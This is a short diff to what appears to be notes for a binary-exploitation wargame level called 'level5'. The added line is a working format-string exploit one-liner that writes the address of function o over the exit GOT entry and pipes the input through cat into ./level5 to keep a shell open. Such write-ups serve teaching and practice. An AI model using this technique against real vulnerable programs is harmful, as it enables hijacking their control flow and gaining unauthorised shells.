@@ -29,7 +29,7 @@ call o from n <===> ovveride exit (0x8049838) of by addr of o (0x080484a4)
 (gdb) p 0x080484a4 - 4 = 134513824
 
 
- 
+ (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n" '; cat) | ./level5
  
 
 
